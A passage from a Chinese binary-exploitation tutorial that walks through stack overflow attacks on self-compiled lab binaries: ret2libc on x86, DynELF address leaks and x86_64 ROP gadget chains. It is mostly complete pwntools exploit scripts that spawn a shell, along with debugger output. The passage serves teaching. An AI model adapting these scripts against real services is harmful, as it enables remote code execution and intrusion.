    # write "/bin/sh" to bss
    payload = offset * 'a'
    payload += p32(elf.plt['read'])
    payload += p32(elf.symbols['func'])# return to func
    payload += p32(0)
    payload += p32(addr_bss)
    payload += p32(10)
    io.send(payload)
    sleep(3)
    io.send('/bin/shx00')
    sleep(3)
    # invoke system
    payload = offset * 'a'
    payload += p32(system_addr)
    payload += p32(0xdeadbeef)
    payload += p32(addr_bss)
    io.send(payload)
    io.interactive()
在第三段payload中我们的返回地址是0xdeadbeef这样写只是用来占位。因为在调用system("/bin/sh")其实是新建了一个进程所以不影响shell的返回。
**在2中利用libc中/bin/sh的情况如下，** 其实有了libc就不需要我们构造/bin/sh了libc中就有/bin/sh。
    gdb-peda$ find '/bin/sh'
    Searching for '/bin/sh' in: None ranges
    Found 1 results, display max 1 items:
    libc : 0xf7f75a8c ("/bin/sh")
然后计算出和read的地址偏移为offset_read_binsh = -0x8420c。payload就变成了两段如下：
    from pwn import *
    io = process("./2")
    elf = ELF("./2")
    offset = 92
    offset_read_system = 0x99a10
    offset_read_binsh = -0x8420c
    payload = offset * 'a'
    payload += p32(elf.plt['write'])
    payload += p32(elf.symbols['func'])
    payload += p32(1)
    payload += p32(elf.got['read'])
    payload += p32(4)
    io.send(payload)
    io.recv(0x100)
    read_addr = u32(io.recv(4))
    log.success("read address =>{}".format(hex(read_addr)))
    system_addr = read_addr - offset_read_system
    log.success("system address =>{}".format(hex(system_addr)))
    binsh_addr = read_addr - offset_read_binsh
    log.success("/bin/sh address =>{}".format(hex(binsh_addr)))
    payload = offset * 'a'
    payload += p32(system_addr)
    payload += p32(0xdeadbeef)
    payload += p32(binsh_addr)
    io.send(payload)
    io.interactive()
**  
**
**0x04 x86开启NX不提供libc.so**
编译方式：
    gcc -m32 1.c -o 3 -O0 -fno-stack-protector
没有libc的情况下就需要pwntools的一个模块来泄漏system地址——DynELF。我们来看看DynELF模块的官方介绍。
Resolving remote functions using leaks.
Resolve symbols in loaded, dynamically-linked ELF binaries. Given a function
which can leak data at an arbitrary address, any symbol in any loaded library
can be resolved.
可以看出只要能完成任意地址读就可以解析动态库的符号所以我们只需要构造一个任意地址读取。构造的exploit如下：
    from pwn import *
    io = process("./3")
    elf = ELF("./3")
    offset = 92
    def leak(address):
        log.info("leak address =>{}".format(hex(address)))
        payload = offset * 'a'
        payload += p32(elf.plt['write'])
        payload += p32(elf.symbols['func'])
        payload += p32(1)
        payload += p32(address)
        payload += p32(4)
        io.send(payload)
        io.recv(0x100)
        ret = io.recv()
        return ret
    d = DynELF(leak, elf = ELF('./3'))
    system_addr = d.lookup("system", "libc")
    log.success("system address =>{}".format(hex(system_addr)))
到这里可以有两种方法写exploit第一种方法是在一次连接里先把/bin/sh写入到bss段再用泄漏出来的system地址来执行第二种方法是泄漏read和system的地址算出偏移。在利用0x02中的写入bss段的方法来写出exploit这里不再赘述。
**0x05 x86_64开启NX提供libc.so**
编译方式：
    gcc 1.c -o 4 -O0 -fno-stack-protector
这里需要注意的是 **x86和x86_64的函数传参方式有所不同：**
1\. 在x86中函数的所有参数由右至左依次放如栈中
2\. 在x86_64中函数的前6个参数依次放入rdi, rsi, rdx, rcx, r8, r9中超过的部分再放入栈中
因此我们在编写exploit的过程中传参必须用ROP Gadget来完成。这里我们使用rp++来搜索需要的ROP
Gadget。因为在我们需要调用的函数有三个参数所以需要pop rdi ret、pop rsi ret和pop rdx
ret。但是在搜索的过程中我们只找到了两个gadget。
    ➜ rp++ -f 4 -r 3 | grep 'pop rdi'
    0x00400643: pop rdi ; ret  ;  (1 found)
    ➜ rp++ -f 4 -r 3 | grep 'pop rsi'
    0x00400641: pop rsi ; pop r15 ; ret  ;  (1 found)
    ➜ rp++ -f 4 -r 3 | grep 'pop rdx'
    ➜
那么问题来了是否我们就不能完成exploit呢答案是不是这样的。
    [----------------------------------registers-----------------------------------]
    RAX: 0x100 
    RBX: 0x0 
    RCX: 0xffffffffffffffff 
    RDX: 0x100 
    [-------------------------------------code-------------------------------------]
    0x4005bb :    leave  
    => 0x4005bc :    ret    
    [------------------------------------stack-------------------------------------]
    0x00000000004005bc in func ()
    gdb-peda$
可以看到在func函数return的时候rdx的值是0x100远大于我们需要的rdx的值。在输入的情况下输入EOF即可在输出的情况下舍弃多余的输出即可。
在x86_64下用0x01的方法可能需要变通下因为EIP到不了高地址。
    [----------------------------------registers-----------------------------------]
    RBP: 0x3541416641414a41 ('AJAAfAA5')
    RSP: 0x7fffffffde58 ("AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAnwj177300g270)")
    RIP: 0x4005bc (:    ret)
    [-------------------------------------code-------------------------------------]
    0x4005bb :    leave  
    => 0x4005bc :    ret    
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    Stopped reason: SIGSEGV
    0x00000000004005bc in func ()
因为栈帧中RBP在RIP的上方8字节所以这次offset应该这样算：
    gdb-peda$ pattern_offset 0x3541416641414a41 
    3837420264933640769 found at offset: 80
offset = 80 + 8 = 88
接下来我们根据上述知识来构造exploit因为有libc.so所以我们使用libc中的/bin/sh具体的exploit如下：
    from pwn import *
    io = process("./4")
    elf = ELF("./4")
    offset = 88
    offset_read_system = 0xa5110
    offset_read_binsh = -0x91223
    pop_rdi_ret = 0x00400643
    pop_rsi_r15_ret = 0x00400641
    payload = offset * 'a'
    payload += p64(pop_rdi_ret)
    payload += p64(1)
    payload += p64(pop_rsi_r15_ret)
    payload += p64(elf.got['read'])
    payload += 'aaaaaaaa' # padding
    payload += p64(elf.plt['write'])
    payload += p64(elf.symbols['func'])
    io.send(payload)
    io.recv(0x100)
    read_addr = u64(io.recv(8))
    log.success("read address =>{}".format(hex(read_addr)))
    system_addr = read_addr - offset_read_system
    log.success("system address =>{}".format(hex(system_addr)))
    binsh_addr = read_addr - offset_read_binsh
    log.success("/bin/sh address =>{}".format(hex(binsh_addr)))
    payload = offset * 'a'
    payload += p64(pop_rdi_ret)
    payload += p64(binsh_addr)
    payload += p64(system_addr)
    io.send(payload)
    io.interactive()
**  
**
**0x06 本文用到的程序下载方式**
gdb: apt-get install gdb
gcc: apt-get install gcc
gdb-peda: [https://github.com/longld/peda](https://github.com/longld/peda)
pwntools: pip install pwntools
gcc-multilib: apt-get install gcc-multilib
socat: apt-get install socat
rp++: [https://github.com/0vercl0k/rp](https://github.com/0vercl0k/rp)
readelf: apt-get install readelf
**  
**
**0x07 参考文献**
一步一步学ROP之linux_x86篇 – 蒸米
一步一步学ROP之linux_x64篇 – 蒸米
二进制漏洞利用与shellcode – 杨坤
**传送门**
* * *
[**【技术分享】跟我入坑PWN第二章** ****](http://bobao.360.cn/learning/detail/3339.html)